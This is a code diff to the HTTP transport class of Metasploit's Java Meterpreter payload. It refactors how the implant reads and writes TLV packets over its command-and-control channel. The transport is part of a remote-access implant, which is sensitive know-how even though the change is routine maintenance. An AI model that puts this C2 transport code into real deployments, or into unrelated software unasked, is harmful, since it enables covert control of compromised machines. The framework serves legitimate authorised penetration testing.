@@ -1,16 +1,15 @@
 package com.metasploit.meterpreter;
 
+import com.metasploit.meterpreter.command.Command;
+
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
-import java.io.OutputStream;
 import java.io.EOFException;
 import java.io.IOException;
-
+import java.io.OutputStream;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
-
-import com.metasploit.meterpreter.command.Command;
 
 public class HttpTransport extends Transport {
     private static final int UA_LEN = 256;
@@ -19,7 +18,6 @@ public class HttpTransport extends Transport {
     private static final int PROXY_PASS_LEN = 64;
     private static final int CERT_HASH_LEN = 20;
     private static final String TRUST_MANAGER = "com.metasploit.meterpreter.PayloadTrustManager";
-    private static final byte[] RECV = new byte[]{'R', 'E', 'C', 'V'};
 
     private URL targetUrl = null;
     private URL nextUrl = null;
@@ -134,16 +132,10 @@ public class HttpTransport extends Transport {
             return false;
         }
 
-        OutputStream outputStream = conn.getOutputStream();
-        outputStream.write(RECV);
-        outputStream.close();
-
         DataInputStream inputStream = new DataInputStream(conn.getInputStream());
 
         try {
-            int len = inputStream.readInt();
-            int type = inputStream.readInt();
-            TLVPacket request = new TLVPacket(inputStream, len - 8);
+            TLVPacket request = this.readAndDecodePacket(inputStream);
             inputStream.close();
 
             // things are looking good, handle the packet and return true, as this
@@ -172,16 +164,10 @@ public class HttpTransport extends Transport {
             return null;
         }
 
-        OutputStream outputStream = conn.getOutputStream();
-        outputStream.write(RECV);
-        outputStream.close();
-
         DataInputStream inputStream = new DataInputStream(conn.getInputStream());
 
         try {
-            int len = inputStream.readInt();
-            int type = inputStream.readInt();
-            TLVPacket request = new TLVPacket(inputStream, len - 8);
+            TLVPacket request = this.readAndDecodePacket(inputStream);
             inputStream.close();
             return request;
         }
@@ -198,22 +184,17 @@ public class HttpTransport extends Transport {
             return;
         }
 
-        byte[] data = packet.toByteArray();
+        conn.setDoOutput(true);
         DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
-        outputStream.writeInt(data.length + 8);
-        outputStream.writeInt(type);
-        outputStream.write(data);
-        outputStream.flush();
+        this.encodePacketAndWrite(packet, type, outputStream);
         outputStream.close();
 
         DataInputStream inputStream = new DataInputStream(conn.getInputStream());
 
         try {
-            int len = inputStream.readInt();
-            type = inputStream.readInt();
+            this.readAndDecodePacket(inputStream);
             // not really worried about the response, we just want to read a packet out of it
             // and move on
-            new TLVPacket(inputStream, len - 8);
             inputStream.close();
         }
         catch (EOFException ex) {
@@ -286,7 +267,6 @@ public class HttpTransport extends Transport {
                     // perhaps log?
                 }
             }
-            conn.setDoOutput(true);
         }
         catch (IOException ex) {
             if (conn != null) {
